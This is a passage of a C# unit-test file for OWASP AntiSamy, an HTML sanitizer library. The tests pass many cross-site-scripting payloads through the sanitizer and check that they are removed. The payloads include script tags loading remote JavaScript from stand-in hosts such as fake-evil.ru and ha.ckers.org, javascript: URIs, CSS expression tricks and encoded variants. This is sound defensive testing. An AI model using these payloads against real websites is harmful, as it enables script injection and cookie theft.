﻿/*
 * Copyright (c) 2009-2021, Arshan Dabirsiaghi, Sebastián Passaro
 * 
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
 * 
 * Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
 * Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
 * Neither the name of OWASP nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR
 * CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 * PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
 * PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
 * LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
 * NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using FluentAssertions;
using NUnit.Framework;
using OWASP.AntiSamy.Html;
using OWASP.AntiSamy.Html.Model;
using Constants = OWASP.AntiSamy.Html.Scan.Constants;

namespace AntiSamyTests
{
    [TestFixture]
    public class AntiSamyTest
    {
        private AntiSamy antisamy;
        private Policy policy;

        [SetUp]
        public void SetUp()
        {
            antisamy = new AntiSamy();
            policy = Policy.GetInstance(TestConstants.DEFAULT_POLICY_PATH);
        }

        [Test(Description = "Test basic XSS cases.")]
        public void TestScriptAttacks()
        {
            antisamy.Scan("test<script>alert(document.cookie)</script>", policy).GetCleanHtml().Should().NotContain("script");
            antisamy.Scan("<<<><<script src=http://fake-evil.ru/test.js>", policy).GetCleanHtml().Should().NotContain("<script");
            antisamy.Scan("<script<script src=http://fake-evil.ru/test.js>>", policy).GetCleanHtml().Should().NotContain("<script");
            antisamy.Scan("<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).GetCleanHtml().Should().NotContain("<script");
            antisamy.Scan("<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>", policy).GetCleanHtml().Should().NotContain("onload");
            antisamy.Scan("<BODY ONLOAD=alert('XSS')>", policy).GetCleanHtml().Should().NotContain("alert");
            antisamy.Scan("<iframe src=http://ha.ckers.org/scriptlet.html <", policy).GetCleanHtml().Should().NotContain("<iframe");
            antisamy.Scan("<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">", policy).GetCleanHtml().Should().NotContain("src");
        }

        [Test]
        public void TestImgAttacks()
        {
            antisamy.Scan("<img src='http://www.myspace.com/img.gif'>", policy).GetCleanHtml().Should().Contain("<img");
            antisamy.Scan("<img src=javascript:alert(document.cookie)>", policy).GetCleanHtml().Should().NotContain("<img");
            antisamy.Scan("<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>", policy).GetCleanHtml()
                .Should().NotContain("<img");
            antisamy.Scan("<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040" +
                "&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>", policy).GetCleanHtml().Should().Contain("&amp;");
            antisamy.Scan("<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>", policy).GetCleanHtml()
                .Should().Contain("&amp;");
            antisamy.Scan("<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">", policy).GetCleanHtml().Should().NotContain("alert");
            antisamy.Scan("<IMG SRC=\"javascript:alert('XSS')\"", policy).GetCleanHtml().Should().NotContain("javascript");
            antisamy.Scan("<IMG LOWSRC=\"javascript:alert('XSS')\">", policy).GetCleanHtml().Should().NotContain("javascript");
            antisamy.Scan("<BGSOUND SRC=\"javascript:alert('XSS');\">", policy).GetCleanHtml().Should().NotContain("javascript");
        }

        [Test]
        public void TestHrefAttacks()
        {
            antisamy.Scan("<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">", policy).GetCleanHtml().Should().NotContain("href");
            antisamy.Scan("<LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\">", policy).GetCleanHtml().Should().NotContain("href");
            antisamy.Scan("<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>", policy).GetCleanHtml().Should().NotContain("ha.ckers.org");
            antisamy.Scan("<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>", policy).GetCleanHtml().Should().NotContain("ha.ckers.org");
            antisamy.Scan("<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>", policy).GetCleanHtml().Should().NotContain("xss.htc");
            antisamy.Scan("<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS", policy).GetCleanHtml().Should().NotContain("javascript");
            antisamy.Scan("<IMG SRC='vbscript:msgbox(\"XSS\")'>", policy).GetCleanHtml().Should().NotContain("vbscript");
            antisamy.Scan("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">", policy).GetCleanHtml().Should().NotContain("<meta");
            antisamy.Scan("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">", policy).GetCleanHtml().Should().NotContain("<meta");
            antisamy.Scan("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">", policy).GetCleanHtml().Should().NotContain("<meta");
            antisamy.Scan("<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>", policy).GetCleanHtml().Should().NotContain("iframe");
            antisamy.Scan("<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>", policy).GetCleanHtml().Should().NotContain("javascript");
            antisamy.Scan("<TABLE BACKGROUND=\"javascript:alert('XSS')\">", policy).GetCleanHtml().Should().NotContain("background");
            antisamy.Scan("<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">", policy).GetCleanHtml().Should().NotContain("background");
            antisamy.Scan("<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">", policy).GetCleanHtml().Should().NotContain("javascript");
            antisamy.Scan("<DIV STYLE=\"width: expression(alert('XSS'));\">", policy).GetCleanHtml().Should().NotContain("alert");
            antisamy.Scan("<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">", policy).GetCleanHtml().Should().NotContain("alert");
            antisamy.Scan("<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>", policy).GetCleanHtml().Should().NotContain("ript:alert");
            antisamy.Scan("<BASE HREF=\"javascript:alert('XSS');//\">", policy).GetCleanHtml().Should().NotContain("javascript");
            antisamy.Scan("<BaSe hReF=\"http://arbitrary.com/\">", policy).GetCleanHtml().Should().NotContain("<base");
            antisamy.Scan("<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://ha.ckers.org/scriptlet.html\"></OBJECT>", policy).GetCleanHtml().Should().NotContain("<object");
            antisamy.Scan("<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>", policy).GetCleanHtml().Should().NotContain("javascript");
            antisamy.Scan("<EMBED SRC=\"http://ha.ckers.org/xss.swf\" AllowScriptAccess=\"always\"></EMBED>", policy).GetCleanHtml().Should().NotContain("<embed");
            antisamy.Scan("<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJod" +
                "HRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUy" +
                "IpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>", policy).GetCleanHtml().Should().NotContain("<embed");
            antisamy.Scan("<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).GetCleanHtml().Should().NotContain("<script");
            antisamy.Scan("<SCRIPT a=\">\" '' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).GetCleanHtml().Should().NotContain("<script");
            antisamy.Scan("<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).GetCleanHtml().Should().NotContain("<script");
            antisamy.Scan("<SCRIPT a=\">'>\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).GetCleanHtml().Should().NotContain("<script");
            antisamy.Scan("<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).GetCleanHtml().Should().NotContain("script");
            antisamy.Scan("<SCRIPT SRC=http://ha.ckers.org/xss.js", policy).GetCleanHtml().Should().NotContain("<script");
            antisamy.Scan("<div/style=&#92&#45&#92&#109&#111&#92&#122&#92&#45&#98&#92&#105&#92&#110&#100&#92&#105&#110&#92&#103:&#92&#117&#114&#108&#40&#47&#47&#98&#117&#115&#105&#110&#101&#115" +
                "&#115&#92&#105&#92&#110&#102&#111&#46&#99&#111&#46&#117&#107&#92&#47&#108&#97&#98&#115&#92&#47&#120&#98&#108&#92&#47&#120&#98&#108&#92&#46&#120&#109&#108&#92&#35&#120&#115&#115" +
                "&#41&>", policy).GetCleanHtml().Should().NotContain("&amp;");
            antisamy.Scan("<a href='aim: &c:\\windows\\system32\\calc.exe' ini='C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\pwnd.bat'>", policy).GetCleanHtml()
                .Should().NotContain("aim.exe");
            antisamy.Scan("<!--\n<A href=\n- --><a href=javascript:alert:document.domain>test-->", policy).GetCleanHtml().Should().NotContain("javascript");
            antisamy.Scan("<a></a style=\"\"xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')\">", policy).GetCleanHtml()
                .Should().NotContain("document");
            antisamy.Scan("<dIv/sTyLe='background-image: url(sheep.png), url(\"javascript:alert(1)\");'></dIv>", policy).GetCleanHtml().Should().Contain("style=''");
            antisamy.Scan("<dIv/sTyLe='background-image: url(sheep.png), url(\"https://safe.com/kitten.jpg\");'></dIv>", policy).GetCleanHtml()
                .Should().ContainAll("sheep.png", "kitten.jpg");
            antisamy.Scan("<a href=\"http://example.com\"&amp;/onclick=alert(9)>foo</a>", policy).GetCleanHtml().Should().Be("<a href=\"http://example.com\" rel=\"nofollow\">foo</a>");
        }

        [Test(Description = "Test CSS protections.")]
        public void TestCssAttacks()
        {
            antisamy.Scan("<div style=\"position:absolute\">", policy).GetCleanHtml().Should().NotContain("position");
            antisamy.Scan("<style>b { position:absolute }</style>", policy).GetCleanHtml().Should().NotContain("position");
            antisamy.Scan("<div style=\"z-index:25\">", policy).GetCleanHtml().Should().NotContain("z-index");
            antisamy.Scan("<style>z-index:25</style>", policy).GetCleanHtml().Should().NotContain("z-index");
        }

        [Test(Description = "Tests issues #12 and #36 from owaspantisamy Google Code Archive.")]
        public void TestEmptyTags()
        {
            string html = antisamy.Scan("<br ><strong></strong><a>hello world</a><b /><i/><hr>", policy).GetCleanHtml();

            var regex = new Regex(".*<strong(\\s*)/>.*");
            regex.IsMatch(html).Should().BeFalse();

            regex = new Regex(".*<b(\\s*)/>.*");
            regex.IsMatch(html).Should().BeFalse();

            regex = new Regex(".*<i(\\s*)/>.*");
            regex.IsMatch(html).Should().BeFalse();

            (html.Contains("<hr />") || html.Contains("<hr/>")).Should().BeTrue();
        }

        [Test(Description = "Tests issue #20 from owaspantisamy Google Code Archive.")]
        public void TestMisplacedTag()
        {
            antisamy.Scan("<b><i>Some Text</b></i>", policy).GetCleanHtml().Should().NotContain("<i />");
        }

        [Test(Description = "Tests issue #25 from owaspantisamy Google Code Archive.")]
        public void TestMarginRemovalFromInlineStyle()
        {
            antisamy.Scan("<div style=\"margin: -5em\">Test</div>", policy).GetCleanHtml().Should().Be("<div style=\"\">Test</div>");
        }

        [Test(Description = "Tests issue #28 from owaspantisamy Google Code Archive.")]
        public void TestPreserveFontFamily()
        {
            antisamy.Scan("<div style=\"font-family: Geneva, Arial, courier new, sans-serif\">Test</div>", policy).GetCleanHtml().Should().Contain("font-family");
        }

        [Test(Description = "Tests issue #30 from owaspantisamy Google Code Archive>: 'missing quotes around properties with spaces'")]
        [Ignore("CDATA is not handled by HtmlAgilityPack the same way than the Java version. The code works but the format is just different.")]
        public void TestCssPropertiesWithMultilineAndCData()
        {
            // The current result in Windows and with HtmlAgilityPack is: 
            // "<style type=\"text/css\">\r\n//<![CDATA[\r\nP { font-family: &quot;Arial Unicode MS&quot; }\r\n//]]>//\r\n</style>"
            const string html = "<style type=\"text/css\"><![CDATA[P {\n	font-family: \"Arial Unicode MS\";\n}\n]]></style>";
            antisamy.Scan(html, policy).GetCleanHtml().Should().Be(html);

            antisamy.Scan("<style type=\"text/css\"><![CDATA[\r\nP {\r\n margin-bottom: 0.08in;\r\n}\r\n]]></style>", policy).GetCleanHtml()
                .Should().Be("<style type=\"text/css\"><![CDATA[P {\n\tmargin-bottom: 0.08in;\n}\n]]></style>");
        }

        [Test(Description = "Tests issue #31 from owaspantisamy Google Code Archive.")]
        public void TestUnknownTagEncoding()
        {
            const string html = "<b><u><g>foo</g></u></b>";

            Policy revised = policy.CloneWithDirective("onUnknownTag", "encode");
            antisamy.Scan(html, revised).GetCleanHtml().Should().ContainAll("&lt;g&gt;", "&lt;/g&gt;");

            Tag tag = policy.GetTagByName("b").MutateAction("encode");
            Policy revised2 = policy.MutateTag(tag);
            antisamy.Scan(html, revised2).GetCleanHtml().Should().ContainAll("&lt;b&gt;", "&lt;/b&gt;");
        }

        [Test(Description = "Tests issue #38 from owaspantisamy Google Code Archive.")]
        public void TestColorProcessing()
        {
            antisamy.Scan("<font color=\"#fff\">Test</font>", policy).GetCleanHtml().Should().Be("<font color=\"#fff\">Test</font>");
            // AngleSharp replaces the CSS color hex value into rgba instead of rgb, expected results are expanded in case the library changes.
            antisamy.Scan("<div style=\"color: #fff\">Test 3 letter code</div>").GetCleanHtml().Should().ContainAny(
                "color: rgba(255, 255, 255, 1)",
                "color: rgba(255,255,255,1)",
                "color: rgb(255, 255, 255)",
                "color: rgb(255,255,255)");
            antisamy.Scan("<font color=\"red\">Test</font>").GetCleanHtml().Should().Be("<font color=\"red\">Test</font>");
            antisamy.Scan("<font color=\"neonpink\">Test</font>").GetCleanHtml().Should().Be("<font>Test</font>");
            antisamy.Scan("<font color=\"#0000\">Test</font>").GetCleanHtml().Should().Be("<font>Test</font>");
            // This gets interpreted by AngleSharp as #0 = #00, so it's valid RGBA (0,0,0,0)
            antisamy.Scan("<div style=\"color: #0000\">Test</div>").GetCleanHtml().Should().ContainAny(
                "color: rgba(0, 0, 0, 0)",
                "color: rgba(0,0,0,0)",
                "color: rgb(0, 0, 0)",
                "color: rgb(0,0,0)");
            // This assertion is added to make the previous case invalid as in the original Java test
            antisamy.Scan("<div style=\"color: #00000\">Test</div>").GetCleanHtml().Should().Be("<div style=\"\">Test</div>");
            antisamy.Scan("<font color=\"#000000\">Test</font>").GetCleanHtml().Should().Be("<font color=\"#000000\">Test</font>");
            // Also AngleSharp asumes 1 in alpha value if the last hex are not present
            antisamy.Scan("<div style=\"color: #000000\">Test</div>").GetCleanHtml().Should().ContainAny(
                "color: rgba(0, 0, 0, 1)",
                "color: rgba(0,0,0,1)",
                "color: rgb(0, 0, 0)",
                "color: rgb(0,0,0)");

            // Testing an error that came up on a dependency from the Java version
            string result = null;
            try
            {
                result = antisamy.Scan("<b><u>foo<style><script>alert(1)</script></style>@import 'x';</u>bar").GetCleanHtml();
            }
            catch (Exception)
            {
                // To comply with try/catch
            }

            result.Should().NotBeNull();
        }

        [Test(Description = "Tests issue #40 from owaspantisamy Google Code Archive.")]
        public void TestMediaAttributeHandling()
        {
            antisamy.Scan("<style media=\"print, projection, screen\"> P { margin: 1em; }</style>", policy).GetCleanHtml()
                .Should().Contain("print, projection, screen");
        }

        [Test(Description = "Tests issue #41 from owaspantisamy Google Code Archive.")]
        public void TestCommentProcessing()
        {
            Policy revised = policy.CloneWithDirective(Constants.PRESERVE_SPACE, "true");

            antisamy.Scan("text <!-- comment -->", revised).GetCleanHtml().Should().Be("text ");

            Policy revised2 = policy
                .CloneWithDirective(Constants.PRESERVE_COMMENTS, "true")
                .CloneWithDirective(Constants.PRESERVE_SPACE, "true")
                .CloneWithDirective(Constants.FORMAT_OUTPUT, "false");

            // These make sure the regular comments are kept alive and that conditional comments are ripped out.
            antisamy.Scan("<div>text <!-- comment --></div>", revised2).GetCleanHtml().Should().Be("<div>text <!-- comment --></div>");
            antisamy.Scan("<div>text <!--[if IE]> comment <[endif]--></div>", revised2).GetCleanHtml().Should().Be("<div>text <!-- comment --></div>");

            /*
            * Check to see how nested conditional comments are handled. This is not very clean but 
            * the main goal is to avoid any tags. Not sure on encodings allowed in comments.
            */
            antisamy.Scan("<div>text <!--[if IE]> <!--[if gte 6]> comment <[endif]--><[endif]--></div>", revised2).GetCleanHtml()
                .Should().Be("<div>text <!-- <!-- comment -->&lt;[endif]--&gt;</div>");

            // Regular comment nested inside conditional comment. Test makes sure.
            antisamy.Scan("<div>text <!--[if IE]> <!-- IE specific --> comment <[endif]--></div>", revised2).GetCleanHtml()
                .Should().Be("<div>text <!-- <!-- IE specific --> comment &lt;[endif]--&gt;</div>");

            // These play with whitespace and have invalid comment syntax.
            antisamy.Scan("<div>text <!-- [ if lte 6 ]>\ncomment <[ endif\n]--></div>", revised2).GetCleanHtml()
                .Should().Be("<div>text <!-- \ncomment --></div>");
            antisamy.Scan("<div>text <![if !IE]> comment <![endif]></div>", revised2).GetCleanHtml()
                .Should().Be("<div>text  comment </div>");
            antisamy.Scan("<div>text <![ if !IE]> comment <![endif]></div>", revised2).GetCleanHtml()
                .Should().Be("<div>text  comment </div>");

            const string attack = "[if lte 8]<script>";
            const string spacer = "<![if IE]>";

            var stringBuilder = new StringBuilder();

            stringBuilder.Append("<div>text<!");
            for (int i = 0; i < attack.Length; i++)
            {
                stringBuilder.Append(attack[i]);
                stringBuilder.Append(spacer);
            }
            stringBuilder.Append("<![endif]>");

            string builtAttack = stringBuilder.ToString();
            antisamy.Scan(builtAttack, revised2).GetCleanHtml().Should().NotContain("<script"); // This one leaves <script> but HTML-encoded

            // This one was added due to issue #61 from nahsra/antisamy
            const string htmlWithCommentInTheMiddle = "<p>this is a test content before start testing</p>" +
                "<!-- TESTING COMMENT --><p>another line</p>" +
                "<p>end of the content</p>";
            antisamy.Scan(htmlWithCommentInTheMiddle, policy.CloneWithDirective(Constants.PRESERVE_COMMENTS, "true"))
                .GetCleanHtml().Should().Be(htmlWithCommentInTheMiddle);
        }

        [Test(Description = "Tests issue #44 from owaspantisamy Google Code Archive.")]
        public void TestErrorsOnChildlessNodesOfNonAllowedElements()
        {
            const int expectedErrorNumber = 3;
            antisamy.Scan("<iframe src='http://foo.com/'></iframe><script src=''></script><link href='/foo.css'>", policy).GetNumberOfErrors()
                .Should().Be(expectedErrorNumber);
        }

        [Test(Description = "Tests issue #51 from owaspantisamy Google Code Archive.")]
        public void TestParenthesesInUrl()
        {
            const int expectedErrorNumber = 0;
            const string html = "<a href='http://subdomain.domain/(S(ke0lpq54bw0fvp53a10e1a45))/MyPage.aspx'>test</a>";
            CleanResults result = antisamy.Scan(html, policy);
            result.GetNumberOfErrors().Should().Be(expectedErrorNumber);
            result.GetCleanHtml().Should().Contain("href='http://subdomain.domain/(S(ke0lpq54bw0fvp53a10e1a45))/MyPage.aspx'");
        }

        [Test(Description = "Tests issue #56 from owaspantisamy Google Code Archive.")]
        public void TestNoSpacesAreAdded()
        {
            // HtmlAgilityPack preverves single quotes and removes last semicolon occurrence
            antisamy.Scan("<SPAN style='font-weight: bold;'>Hello World!</SPAN>", policy).GetCleanHtml()
                .Should().Contain("<span style='font-weight: bold'>Hello World!</span>");
        }

        [Test(Description = "Tests issue #58 from owaspantisamy Google Code Archive.")]
        public void TestNotAllowedInputTag()
        {
            antisamy.Scan("tgdan <input/> g  h", policy).GetNumberOfErrors()
                .Should().Be(0);
        }

        [Test(Description = "Tests issue #61 from owaspantisamy Google Code Archive.")]
        public void TestPreventNewLineAtEndOfLastValidTag()
        {
            const string dirtyInput = "blah <b>blah</b>.";
            antisamy.Scan(dirtyInput, policy).GetCleanHtml().Should().Be(dirtyInput);
        }

        [Test(Description = "Tests issue #69 from owaspantisamy Google Code Archive.")]
        public void TestCharAttribute()
        {
            antisamy.Scan("<table><tr><td char='.'>test</td></tr></table>", policy).GetCleanHtml().Should().Contain("char");
            antisamy.Scan("<table><tr><td char='..'>test</td></tr></table>", policy).GetCleanHtml().Should().NotContain("char");
            antisamy.Scan("<table><tr><td char='&quot;'>test</td></tr></table>", policy).GetCleanHtml().Should().Contain("char");
            antisamy.Scan("<table><tr><td char='&quot;a'>test</td></tr></table>", policy).GetCleanHtml().Should().NotContain("char");
            antisamy.Scan("<table><tr><td char='&quot;&amp;'>test</td></tr></table>", policy).GetCleanHtml().Should().NotContain("char");
        }

        [Test]
        public void TestLiteralLists()
        {
            CleanResults result = antisamy.Scan("hello<p align='invalid'>world</p>", policy);
            result.GetCleanHtml().Should().NotContain("invalid");
            result.GetNumberOfErrors().Should().Be(1);

            antisamy.Scan("hello<p align='left'>world</p>", policy).GetCleanHtml().Should().Contain("left");
        }

        [Test]
        public void TestStackExhaustion()
        {
            // This test was to measure how much it can be pushed with nesting
            var sb = new StringBuilder();
            for (int i = 0; i < Constants.MAX_NESTED_TAGS; i++)
            {
                sb.Append("<div>");
            }
            antisamy.Scan(sb.ToString(), policy).GetCleanHtml().Should().NotBeNullOrEmpty();

            // Add one more tag to push the limit
            sb.Append("<div>");
            string result = null;
            try
            {
                result = antisamy.Scan(sb.ToString()).GetCleanHtml();
            }
            catch (OWASP.AntiSamy.Exceptions.ScanException)
            {
                // To comply with try/catch
            }

            result.Should().BeNull();
        }

        [Test(Description = "Tests issue #107 from owaspantisamy Google Code Archive.")]
        public void TestErroneousNewLinesAppearing()
        {
            var sb = new StringBuilder();
            const string nl = "\n";
            const string header = "<h1>Header</h1>";
            const string para = "<p>Paragraph</p>";
            sb.Append(header);
            sb.Append(nl);
            sb.Append(para);

            string html = sb.ToString();
            string result = antisamy.Scan(html, policy).GetCleanHtml();
            result.IndexOf(nl).Should().Be(result.LastIndexOf(nl));

            int expectedLocation = header.Length;
            int actualLocation = result.IndexOf(nl);
            actualLocation.Should().BeInRange(expectedLocation - 1, expectedLocation,
                because: "According to Java project: 'account for line separator length difference across OSes'");
        }

        [Test(Description = "Tests issue #112 from owaspantisamy Google Code Archive.")]
        public void TestEmptyTagSelfClosing()
        {
            Policy revised = policy
                .CloneWithDirective(Constants.PRESERVE_COMMENTS, "true")
                .CloneWithDirective(Constants.PRESERVE_SPACE, "true")
                .CloneWithDirective(Constants.FORMAT_OUTPUT, "false");

            antisamy.Scan("text <strong></strong> text <strong><em></em></strong> text", revised).GetCleanHtml()
                .Should().NotContainAll("<strong />", "<strong/>");

            Policy revised2 = revised.CloneWithDirective(Constants.USE_XHTML, "true");

            // Due to CDATA handling on title tag, test result is not equality checking.
            antisamy.Scan("<html><head><title>foobar</title></head><body><img src=\"http://foobar.com/pic.gif\" /></body></html>", revised2).GetCleanHtml().Should()
                .ContainAll("<title>", "foobar", "</title>", "<body><img src=\"http://foobar.com/pic.gif\" /></body>");
        }

        [Test]
        [Ignore("HtmlAgilityPack does not parse CDATA tags very well. This in particular, is wrong.")]
        public void TestCDataBypass()
        {
            CleanResults result = antisamy.Scan("<![CDATA[]><script>alert(1)</script>]]>", policy);
            result.GetNumberOfErrors().Should().BeGreaterThan(0);
            result.GetCleanHtml().Should().Contain("&lt;script").And.NotContain("<script");
        }

        [Test]
        [Ignore("HtmlAgilityPack does not parse CDATA tags very well. This in particular, is wrong.")]
        public void TestNestedCDataAttack()
        {
            antisamy.Scan("<![CDATA[]><script>alert(1)</script><![CDATA[]>]]><script>alert(2)</script>>]]>", policy).GetCleanHtml().
                Should().NotContain("<script>");
        }

        [Test(Description = "Tests issue #101 from owaspantisamy Google Code Archive.")]
        public void TestInternationalCharacterSupport()
        {
            const string html = "<b>letter 'a' with umlaut: \u00e4";

            Policy revised = policy.CloneWithDirective(Constants.ENTITY_ENCODE_INERNATIONAL_CHARS, "false");
            antisamy.Scan(html, revised).GetCleanHtml().Should().Contain("\u00e4");

            Policy revised2 = policy.CloneWithDirective(Constants.ENTITY_ENCODE_INERNATIONAL_CHARS, "true")
                .CloneWithDirective(Constants.USE_XHTML, "false");
            antisamy.Scan(html, revised2).GetCleanHtml().Should().Contain("&auml;").And.NotContain("\u00e4");

            Policy revised3 = policy.CloneWithDirective(Constants.ENTITY_ENCODE_INERNATIONAL_CHARS, "true")
                .CloneWithDirective(Constants.USE_XHTML, "true");
            antisamy.Scan(html, revised3).GetCleanHtml().Should().Contain("&auml;").And.NotContain("\u00e4");

            antisamy.Scan("<span id=\"my-span\" class='my-class'>More special characters: ɢ♠♤á</span>", revised2).GetCleanHtml().Should()
                .Be("<span id=\"my-span\" class='my-class'>More special characters: &#610;&spades;&#9828;&aacute;</span>");
        }

        [Test]
        [Ignore("Current result is <iframe />, more inspection is needed.")]
        public void TestIframeValidation()
        {
            var tag = new Tag("iframe", Constants.ACTION_VALIDATE, new Dictionary<string, OWASP.AntiSamy.Html.Model.Attribute>());
            Policy revised = policy.MutateTag(tag);

            antisamy.Scan("<iframe></iframe>", revised).GetCleanHtml().Should().Be("<iframe></iframe>");
        }

        /*
	     * Tests cases dealing with nofollowAnchors directive. Assumes anchor tags
	     * have an action set to "validate" (may be implicit) in the policy file.
	     */
        [Test]
        public void TestNoFollowAnchors()
        {
            // If we have activated nofollowAnchors
            Policy revised = policy.CloneWithDirective(Constants.ANCHORS_NOFOLLOW, "true");

            // Adds when not present
            antisamy.Scan("<a href=\"blah\">link</a>", revised).GetCleanHtml().Should().Be("<a href=\"blah\" rel=\"nofollow\">link</a>");
            // Adds properly even with bad attr
            antisamy.Scan("<a href=\"blah\" bad=\"true\">link</a>", revised).GetCleanHtml().Should().Be("<a href=\"blah\" rel=\"nofollow\">link</a>");
            // rel with bad value gets corrected
            antisamy.Scan("<a href=\"blah\" rel=\"blh\">link</a>", revised).GetCleanHtml().Should().Be("<a href=\"blah\" rel=\"nofollow\">link</a>");
            // Correct attribute doesn't get messed with
            antisamy.Scan("<a href=\"blah\" rel=\"nofollow\">link</a>", revised).GetCleanHtml().Should().Be("<a href=\"blah\" rel=\"nofollow\">link</a>");
            // If two correct attributes, only one remaining after scan
            antisamy.Scan("<a href=\"blah\" rel=\"nofollow\" rel=\"nofollow\">link</a>", revised).GetCleanHtml().Should().Be("<a href=\"blah\" rel=\"nofollow\">link</a>");
            // Test if value is off - does it add?
            antisamy.Scan("a href=\"blah\">link</a>", revised).GetCleanHtml().Should().NotContain("nofollow");
        }

        [Test]
        public void TestValidateParamAsEmbed()
        {
            Policy revised = policy.CloneWithDirective(Constants.VALIDATE_PARAM_AS_EMBED, "true");

            // Let's start with a YouTube embed
            string input = "<object width=\"560\" height=\"340\"><param name=\"movie\" value=\"http://www.youtube.com/v/IyAyd4WnvhU&hl=en&fs=1&\"></param><param name=\"allowFullScreen\" value=\"true\"></param><param name=\"allowscriptaccess\" value=\"always\"></param><embed src=\"http://www.youtube.com/v/IyAyd4WnvhU&hl=en&fs=1&\" type=\"application/x-shockwave-flash\" allowscriptaccess=\"always\" allowfullscreen=\"true\" width=\"560\" height=\"340\"></embed></object>";
            string expectedOutput = "<object width=\"560\" height=\"340\"><param name=\"movie\" value=\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\" /><param name=\"allowFullScreen\" value=\"true\" /><param name=\"allowscriptaccess\" value=\"always\" /><embed src=\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\" type=\"application/x-shockwave-flash\" allowscriptaccess=\"always\" allowfullscreen=\"true\" width=\"560\" height=\"340\" /></object>";
            antisamy.Scan(input, revised).GetCleanHtml().Should().Be(expectedOutput);

            // Now what if someone sticks malicious URL in the value of the value attribute in the param tag? Remove that param tag
